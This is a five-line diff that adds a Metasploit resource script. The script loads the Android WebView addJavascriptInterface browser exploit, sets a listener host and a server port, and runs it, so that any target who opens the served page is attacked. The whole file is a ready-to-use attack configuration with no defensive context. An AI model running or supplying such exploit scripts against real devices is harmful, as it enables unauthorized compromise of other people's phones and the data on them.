@@ -1,0 +1,5 @@
+# This exploit start a web page which need to be accessed by target
+use exploit/android/browser/webview_addjavascriptinterface
+set LHOST 192.168.0.100
+set SRVPORT 80
+run
